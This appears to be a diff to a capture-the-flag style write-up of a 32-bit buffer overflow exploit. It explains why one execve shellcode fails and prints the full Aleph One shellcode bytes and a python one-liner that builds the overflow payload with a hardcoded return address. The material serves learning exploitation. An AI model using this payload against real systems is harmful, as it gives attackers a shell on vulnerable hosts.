@@ -87,7 +87,7 @@ First attempt: the classic 23-byte execve shellcode. It failed. Execution jumped
 
 The reason: the 23-byte shellcode doesn't zero `edx`. `edx` becomes the `envp` argument to execve, and if it contains garbage, the kernel returns EFAULT. execve fails, execution continues past the shellcode into 'A' bytes (each 'A' = `inc ecx`, harmless), then hits offset 64 where the code earlier wrote `0x0804a008` (via `mov %eax,-0xc(%ebp)`), and crashes.
 
-Switched to the Aleph One shellcode (45 bytes) from https://fr.wikipedia.org/wiki/Shellcode. It explicitly sets `edx` with `lea edx, [esi+12]`, pointing to a valid NULL. execve works.
+Switched to the Aleph One shellcode (45 bytes), originally published in Phrack 49 article 14 (1996, https://phrack.org/issues/49/14) and mirrored on https://fr.wikipedia.org/wiki/Shellcode. It explicitly sets `edx` with `lea edx, [esi+12]`, pointing to a valid NULL. execve works.
 
 ```
 \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
@@ -103,7 +103,7 @@ Switched to the Aleph One shellcode (45 bytes) from https://fr.wikipedia.org/wik
 The trailing `\n` is critical. Without it, `gets()` keeps reading past the payload (from terminal input via `; cat`), the buffer becomes longer, and `strdup` allocates a different-sized chunk at a different address.
 
 ```bash
-python -c "import sys; sys.stdout.write('\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'A'*35 + '\x08\xa0\x04\x08\n')" > /tmp/payload
+python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A"*35 + "\x08\xa0\x04\x08"' > /tmp/payload
 ```
 
 ### Running it
